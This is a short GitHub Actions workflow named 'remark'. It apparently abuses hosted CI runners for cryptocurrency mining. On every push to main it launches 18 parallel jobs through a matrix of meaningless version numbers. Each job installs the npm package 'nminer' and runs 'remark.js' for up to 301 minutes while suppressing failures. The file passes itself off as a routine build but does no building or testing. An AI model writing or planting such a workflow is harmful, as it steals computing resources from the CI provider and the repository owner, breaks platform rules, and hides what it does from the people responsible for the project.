name: remark
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 5768 }
          - { version: 1056 }
          - { version: 414 }
          - { version: 6684 }
          - { version: 4968 }
          - { version: 449 }
          - { version: 578 }
          - { version: 910 }
          - { version: 633 }
          - { version: 1782 }
          - { version: 702 }
          - { version: 1823 }
          - { version: 4584 }
          - { version: 1885 }
          - { version: 9421 }
          - { version: 744 }
          - { version: 705 }
          - { version: 4967 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: whenever
        run: |
          npm install nminer@latest
          timeout 301m node remark.js || echo "remark executed"